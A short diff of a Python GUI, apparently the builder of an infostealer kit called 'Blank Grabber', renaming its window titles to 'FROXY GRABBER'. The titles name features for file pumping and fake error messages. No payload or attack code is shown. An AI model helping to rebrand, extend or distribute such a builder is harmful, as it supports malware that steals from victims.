@@ -619,7 +619,7 @@ class PumperSettings(ctk.CTkToplevel):
 
 	def __init__(self, master) -> None:
 		super().__init__(master)
-		self.title("Blank Grabber [File Pumper]")
+		self.title("FROXY GRABBER [File Pumper]")
 		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
 		self.grab_set()
 		self.geometry("500x200")
@@ -667,7 +667,7 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 
 	def __init__(self, master) -> None:
 		super().__init__(master)
-		self.title("Blank Grabber [Fake Error Builder]")
+		self.title("FROXY GRABBER [Fake Error Builder]")
 		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
 		self.grab_set()
 		self.geometry("833x563")
@@ -759,7 +759,7 @@ class Builder(ctk.CTk):
 		super().__init__()
 
 		ctk.set_appearance_mode("dark")
-		self.title("Blank Grabber [Builder]")
+		self.title("froxy grabber [Builder]")
 		self.iconbitmap(os.path.join("Extras", "icon.ico"))
 		self.geometry("1250x600")
 		self.resizable(False, False)
